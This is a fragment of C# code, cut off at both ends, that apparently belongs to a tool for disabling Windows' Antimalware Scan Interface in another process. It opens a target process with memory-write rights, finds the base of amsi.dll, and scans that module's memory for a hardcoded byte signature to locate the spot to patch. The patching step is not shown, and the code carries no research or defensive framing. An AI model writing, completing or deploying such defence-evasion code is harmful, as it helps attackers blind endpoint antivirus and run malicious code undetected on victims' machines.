 byte[] pattern = { 0x48, 0x00, 0x00, 0x74, 0x00, 0x48, 0x00, 0x00, 0x74 };
    uint patternSize = (uint)pattern.Length;
    uint bufferSize = 0x10000; // Read 64KB at a time

    uint tpid = pid;
    if (tpid == 0)
    {
        Console.WriteLine("Process not found.");
        return;
    }

    Console.WriteLine("Process PID: " + tpid);

    IntPtr processHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, tpid);
    if (processHandle == IntPtr.Zero)
    {
        Console.WriteLine("Failed to open process. Error: " + GetLastError());
        return;
    }

    // Get the base address of amsi.dll in the remote process
    IntPtr amsiBaseAddress = GetRemoteModuleBaseAddress(processHandle, "amsi.dll", out uint amsiSize);
    if (amsiBaseAddress == IntPtr.Zero)
    {
        Console.WriteLine("Failed to find amsi.dll in the target process.");
        return;
    }

    Console.WriteLine("amsi.dll base address: 0x" + amsiBaseAddress.ToString("X"));

    // Read more memory to ensure we're scanning a large enough region
    byte[] buffer = new byte[bufferSize];
    uint bytesRead;

    IntPtr currentAddress = amsiBaseAddress;

    // Loop to read multiple chunks of memory if needed
    for (int i = 0; i < 10; i++) // Adjust as necessary to scan further
    {
        if (!ReadProcessMemory(processHandle, currentAddress, buffer, bufferSize, out bytesRead))
        {
            Console.WriteLine("Failed to read process memory. Error: " + GetLastError());
            return;
        }

        Console.WriteLine("Read {0} bytes from address 0x{1:X}", bytesRead, currentAddress.ToInt64());

        // Search for the pattern in the buffer
        ulong matchOffset = SearchPattern(buffer, bytesRead, pattern, patternSize);
        if (matchOffset != 0)
        {
            ulong updateAmsiAddress = (ulong)currentAddress.ToInt64() + matchOffset;
            Console.WriteLine("Pattern found at address: 0x{0:X}", updateAmsiAddress);
            break; // Exit after finding the pattern, or continue if looking for multiple occurrences
        }

        // Move to the next memory region
        currentAddress = IntPtr.Add(currentAddress, (int)bufferSize);
    }
}

private static IntPtr GetRemoteModuleBaseAddress(IntPtr processHandle, string moduleName, out uint moduleSize)
{
    moduleSize = 0;
    IntPtr[] modules = new IntPtr[1024];
    uint cb = (uint)(IntPtr.Size * modules.Length);
    uint cbNeeded;

    if (EnumProcessModulesEx(processHandle, modules, cb, out cbNeeded, LIST_MODULES_ALL))
    {
        int moduleCount = (int)(cbNeeded / IntPtr.Size);

        for (int i = 0; i < moduleCount; i++)
        {
            char[] moduleNameBuffer = new char[255];
            GetModuleBaseName(processHandle, modules[i], moduleNameBuffer, (uint)moduleNameBuffer.Length);
            string moduleBaseName = new string(moduleNameBuffer).TrimEnd('\0');

            if (moduleBaseName.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
            {
                MODULEINFO moduleInfo;
                if (GetModuleInformation(processHandle, modules[i], out moduleInfo, (uint)Marshal.SizeOf(typeof(MODULEINFO))))
                {
                    moduleSize = moduleInfo.SizeOfImage;
                    return moduleInfo.lpBaseOfDll;
                }
            }
        }
    }

    return IntPtr.Zero; // Module not found
